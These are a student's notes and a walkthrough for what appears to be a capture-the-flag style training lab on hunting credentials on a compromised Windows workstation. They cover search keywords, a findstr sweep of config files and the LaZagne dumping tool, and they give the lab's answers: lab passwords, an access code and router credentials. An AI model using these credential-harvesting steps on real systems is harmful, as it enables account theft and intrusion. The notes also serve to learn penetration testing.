Once we have access to a target Windows machine through the GUI or CLI, we can significantly benefit from incorporating credential hunting into our approach. Credential Hunting is the process of performing detailed searches across the file system and through various applications to discover credentials. To understand this concept, let's place ourselves in a scenario. We have gained access to an IT admin's Windows 10 workstation through RDP.

Search Centric
Many of the tools available to us in Windows have search functionality. In this day and age, there are search-centric features built into most applications and operating systems, so we can use this to our advantage on an engagement. A user may have documented their passwords somewhere on the system. There may even be default credentials that could be found in various files. It would be wise to base our search for credentials on what we know about how the target system is being used. In this case, we know we have access to an IT admin's workstation.

What might an IT admin be doing on a day-to-day basis & which of those tasks may require credentials?

We can use this question & consideration to refine our search to reduce the need for random guessing as much as possible.

Key Terms to Search
Whether we end up with access to the GUI or CLI, we know we will have some tools to use for searching but of equal importance is what exactly we are searching for. Here are some helpful key terms we can use that can help us discover some credentials:

Passwords	Passphrases	Keys
Username	User account	Creds
Users	Passkeys	Passphrases
configuration	dbcredential	dbpassword
pwd	Login	Credentials


We can also take advantage of third-party tools like Lazagne (https://github.com/AlessandroZ/LaZagne)  to quickly discover credentials that web browsers or other installed applications may insecurely store. It would be beneficial to keep a standalone copy (https://github.com/AlessandroZ/LaZagne/releases/) of Lazagne on our attack host so we can quickly transfer it over to the target. Lazagne.exe will do just fine for us in this scenario. We can use our RDP client to copy the file over to the target from our attack host. If we are using xfreerdp all we must do is copy and paste into the RDP session we have established.

Once Lazagne.exe is on the target, we can open command prompt or PowerShell, navigate to the directory the file was uploaded to, and execute the following command:


Running Lazagne All 

Syntax: C:\Users\bob\Desktop> start lazagne.exe all

we can also use findstr to help us find key terms inside of files 

SYNTAX: C:\> findstr /SIM /C:"password" *.txt *.ini *.cfg *.config *.xml *.git *.ps1 *.yml


CHALLENGE: 10.129.202.99 RDP to 10.129.202.99 (ACADEMY-PWATTACKS-WIN10CHUNTING) with user "Bob" and password "HTB_@cademy_stdnt!"


Question 1 - What password does Bob use to connect to the Switches via SSH? (Format: Case-Sensitive)
1) xfreerdp /v:10.129.202.99 /u:Bob /p:HTB_@cademy_stdnt! /drive:shared,/home/htb-ac-1235531/Desktop
2) On desktop we see a folder called work stuff > creds > passwords
Switches via SSH		admin	WellConnected123
DC via RDP		bwilliamson	P@55w0rd!





Question 2 -  What is the GitLab access code Bob uses? (Format: Case-Sensitive)
1) from steps above click on work stuff > creds > gitlabaccessCodeJustinCase file -> 3z1ePfGbjWPsTfCsZfjy

Question 3 - What credentials does Bob use with WinSCP to connect to the file server? (Format: username:password, Case-Sensitive)
1) xfreerdp /v:10.129.202.99 /u:Bob /p:HTB_@cademy_stdnt! /drive:shared,/home/htb-ac-1235531/Desktop
2) download Lazagne.exe from github -> https://github.com/AlessandroZ/LaZagne/releases/tag/v2.4.6
3) copy to RDP session desktop 
4) open powershell as admin 
5) .\LaZagne.exe all 
6) [+] Password found !!!
URL: 10.129.202.64
Login: ubuntu
Password: FSadmin123
Port: 22



Question 4 - What is the default password of every newly created Inlanefreight Domain user account? (Format: Case-Sensitive)
1) go to file explorer -> C:\Automations&Scripts -> BulkaddADusers powershell script -> 
Import-Module ActiveDirectory
Import-Csv "C:\Users\bob\WorkStuff\NewUsers.csv" | ForEach-Object {
 $userPrincipal = $_."samAccountName" + "@inlanefreight.local"
New-ADUser -Name $_.Name `
 -Path $_."ParentOU"
 -SamAccountName $_."samAccountName" `
 -UserPrincipalName $userPrincipal ` 
 -AccountPassword (ConvertTo-SecureString "Inlanefreightisgreat2022" -AsPlainText -Force) `
 -ChangePasswordAtLogon $true
 -Enabled $true 
Add-ADGroupMember "Domain Admins" $_."samAccountName";

2) we see password is Inlanefreightisgreat2022

Question 5 - What are the credentials to access the Edge-Router? (Format: username:password, Case-Sensitive)edgeadmin:Edge@dmin123!
1) in the C:\Automations&Scripts there is an ansible folder click that -> EdgeRouterConfigs -> 

  tasks: 
    - name: Checking NETCONF connectivity
      wait_for:
        host: "{ Edge-Router }"
        port: "{ netconf_port }"
        timeout: 5
    - name: Configure Interfaces Status
      user: "{ edgeadmin }"
      passwd: "{ Edge@dmin123!} "
# Need to finish configuring this task. I should probably read some books on ansible.
